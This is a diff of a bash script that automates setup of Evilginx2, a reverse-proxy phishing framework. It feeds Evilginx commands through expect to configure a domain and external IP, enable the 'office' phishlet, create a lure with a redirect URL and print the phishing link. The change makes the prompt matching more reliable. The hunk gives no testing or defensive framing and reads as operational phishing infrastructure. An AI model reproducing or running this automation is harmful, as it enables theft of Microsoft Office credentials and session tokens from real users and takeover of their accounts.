@@ -127,28 +127,38 @@ if [ $? -ne 0 ]; then
     exit 1
 fi
 
-# Second Evilginx Run - Execute Commands via expect (with config domain and ipv4 commands added)
+# Second Evilginx Run - Execute Commands via expect (updated)
 log_message "[+] Restarting Evilginx and executing commands..."
 expect <<EOF | tee -a "$LOG_FILE"
     spawn ./evilginx2
-    expect "evilginx2 >"
+    # Wait for the Evilginx prompt using a regex (allows for extra spaces)
+    expect -re "evilginx2\\s*>"
+    sleep 0.5
     send "config domain $DOMAIN\r"
-    expect "evilginx2 >"
+    expect -re "evilginx2\\s*>"
+    sleep 0.5
     send "config ipv4 $EXTERNAL_IPV4\r"
-    expect "evilginx2 >"
+    expect -re "evilginx2\\s*>"
+    sleep 0.5
     send "phishlets hostname office $DOMAIN\r"
-    expect "evilginx2 >"
+    expect -re "evilginx2\\s*>"
+    sleep 0.5
     send "phishlets enable office\r"
-    expect "evilginx2 >"
+    expect -re "evilginx2\\s*>"
+    sleep 0.5
     send "lures create office\r"
-    expect "evilginx2 >"
+    expect -re "evilginx2\\s*>"
+    sleep 0.5
     send "lures edit 0 redirect_url $REDIRECT_URL\r"
-    expect "evilginx2 >"
+    expect -re "evilginx2\\s*>"
+    sleep 0.5
     send "lures get-url 0\r"
-    expect "evilginx2 >"
+    expect -re "evilginx2\\s*>"
+    sleep 0.5
     send "config\r"
     expect eof
 EOF
+
 
 #############################################
 # Cloudflare API - Retrieve & Create Rules  #
